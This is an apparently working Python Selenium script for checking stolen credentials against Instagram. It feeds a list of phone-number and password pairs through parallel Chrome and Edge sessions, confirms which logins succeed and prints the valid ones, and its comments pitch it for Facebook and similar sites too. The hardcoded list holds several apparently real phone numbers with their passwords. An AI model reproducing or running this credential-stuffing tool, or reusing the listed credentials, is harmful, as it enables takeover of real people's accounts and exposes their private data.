# check faster when u know all the attributes(login details from html)
# Use THIS FOR APPS LIKE INSTA FACEBOOK ETC.... JUST TO LOGIN AND TO CHECK IF SUCCESS
# u can directly paste the table data without converting it
# USE THIS TO CHECK IF LOGINS TO ANY WEBPAGE LIKE INSTA OR FACEBOOK


#do from 1st

import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException, TimeoutException, NoSuchWindowException
import threading
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# PAGE 
login_url = "https://www.instagram.com"
notification_url = "https://www.instagram.com/notifications/"  # notification page just to confirm that it is logged URL
app_login_mobile = "input[name='username']"
app_login_password = "input[name='password']"
app_login_button = "button[type='submit']"
profile_btn_path = "'.x1i10hfl.xjbqb8w.x6umtig.x1b1mbwd.xaqea5y.xav7gou.x9f619.x1ypdohk.xt0psk2.xe8uvvx.xdj266r.x11i5rnm.xat24cr.x1mh8g0r.xexx8yu.x4uap5.x18d9i69.xkhd6sd.x16tdsg8.x1hl2dhg.xggy1nq.x1a2a7pz._a6hd:nth-child(13)'"
followers_xpath="/html/body/div[2]/div/div/div[2]/div/div/div/div[1]/div[1]/div[2]/div[2]/section/main/div/ul/li[2]/a/span/span/span"
following_xpath="/html/body/div[2]/div/div/div[2]/div/div/div/div[1]/div[1]/div[2]/div[2]/section/main/div/ul/li[3]/a/span/span/span"


#mobile password
input_data = """\
6362572340	Varun
6362419707	Shashank@19
6360727624	Vasu
9740628863	Jeevan@123
7483725974	h12rnak0u4
8277905693	mysonamaan
9353720007	shreethu13
8660730618	Ujwal@1234
6362572346	Varunt
"""

lines = input_data.split('\n')
credentials = []
for line in lines:
    parts = line.split()
    if len(parts) == 2:
        mobile, password = parts 
        credentials.append((mobile, password))
print("credentials =", credentials)

successful_login = []
profile_details = []

def get_profile(browser_name, credentials):
    # Define the options for headless mode
    if browser_name == "Chrome":
        options = webdriver.ChromeOptions()
        # options.add_argument('--headless')
        driver = webdriver.Chrome(options=options)
    else:
        options = webdriver.EdgeOptions()
        # options.add_argument('--headless')
        driver = webdriver.Edge(options=options)
    wait = WebDriverWait(driver, 10) #wait until driver loads for 10 sec if not loaded then it will stop

    for mobile, password in credentials:
        try:
            driver.get(login_url)
            print(f"{mobile} is logging in...")
            username_field = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, app_login_mobile))) #check presence and also access
            password_field = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, app_login_password)))
            username_field.send_keys(mobile)
            password_field.send_keys(password)
            login_button = driver.find_element(By.CSS_SELECTOR, app_login_button)
            login_button.click()
            time.sleep(5)
            driver.get(notification_url)
            for _ in range(10):#wait till url changes and goes to notification page from home page
                if driver.current_url==notification_url:
                    break
                time.sleep(0.5)
            if driver.current_url == notification_url:
                print(f"Login Sucessful for {mobile}!")
                successful_login.append((mobile,password))
                profile_button = driver.find_element(By.XPATH, profile_btn_path) #stucks here"!
                profile_href = profile_button.get_attribute("href")
                print(profile_button)
                print(profile_href)
                driver.get(profile_href)
                wait.until(EC.url_changes(driver.current_url)) #wait till url changes and goes to profile page from current page
                print(driver.current_url) # profile page is expected output

                '''
                if profile page is loaded then do this:
                
                    print(f"Profile Page Loaded for {mobile}!")
                    followers_element = wait.until(EC.presence_of_element_located((By.XPATH, followers_xpath)))
                    following_element = wait.until(EC.presence_of_element_located((By.XPATH, following_xpath)))
                    followers = followers_element.text
                    following = following_element.text
                    profile_details.append((mobile,password,followers,following))
                    '''
                

            else:
                print(f"Failed Login for {mobile}")

        except NoSuchElementException:
            print(f"Element not found!. Check your element for variables in the HTML code using attribute-checker.py")
        except TimeoutException:
            print(f"Timed out while waiting to load for {mobile}.")
        except NoSuchWindowException:
            print(f"The browser window was closed unexpectedly for {mobile}.")
        except Exception:
            print(f"An unexpected error occurred for {mobile}")
    driver.quit()

def split_credentials(credentials):
    mid = len(credentials) // 2
    return credentials[:mid], credentials[mid:]


if __name__ == '__main__':
    # process: get the withdraw/balance amount 
    chrome_credentials, edge_credentials = split_credentials(credentials)
    # Create two threads for Chrome and Edge browsers for get_profile
    chrome_thread = threading.Thread(target=get_profile, args=("Chrome", chrome_credentials))
    edge_thread = threading.Thread(target=get_profile, args=("Edge", edge_credentials))
    # Start both threads
    chrome_thread.start()
    edge_thread.start()
    # Wait for both threads to finish
    chrome_thread.join()
    edge_thread.join()
    # Print in a single table format
    if successful_login:
        print("\nSuccessful Logins:")
        print("Mobile\t\tPassword")
        for mobile, password in successful_login:
            print(f"{mobile}\t{password}")
    if profile_details:
        print("\nSuccessful Logins with Profile Details:")
        print("Mobile\t\tPassword\t\tFollowers\t\tFollowing")
        for mobile, password, followers, following in profile_details:
            print(f"{mobile}\t{password}\t{followers}\t{following}")
